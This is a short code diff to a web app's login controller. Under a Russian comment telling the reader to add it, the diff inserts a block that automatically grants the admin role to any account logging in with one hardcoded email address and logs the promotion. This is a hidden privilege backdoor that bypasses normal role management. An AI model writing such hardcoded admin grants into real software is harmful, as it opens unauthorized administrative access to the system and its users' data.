@@ -84,22 +84,26 @@ export const authController = {
                 });
             }
 
-            const token = await reply.jwtSign({ id: user.id, email: user.email });
+            // 👇 ДОБАВЬТЕ ЭТО: автоматическое обновление прав администратора
+            if (email === 'kooooooffe@gmail.com' && user.role !== 'admin') {
+                await UserModel.update(user.id, { role: 'admin' });
+                user.role = 'admin';
+                console.log('✅ Auto-promoted to admin:', email);
+            }
 
-            // ИСПРАВЛЕНО: получаем полные данные пользователя
-            const fullUser = await UserModel.findById(user.id);
+            const token = await reply.jwtSign({ id: user.id, email: user.email });
 
             return reply.send({
                 success: true,
                 token,
                 user: {
-                    id: fullUser?.id,
-                    email: fullUser?.email,
-                    name: fullUser?.name,
-                    role: fullUser?.role,
-                    carModel: fullUser?.car_model,
-                    carYear: fullUser?.car_year,
-                    licensePlate: fullUser?.license_plate
+                    id: user.id,
+                    email: user.email,
+                    name: user.name,
+                    role: user.role,
+                    carModel: user.car_model,
+                    carYear: user.car_year,
+                    licensePlate: user.license_plate
                 }
             });
         } catch (error) {
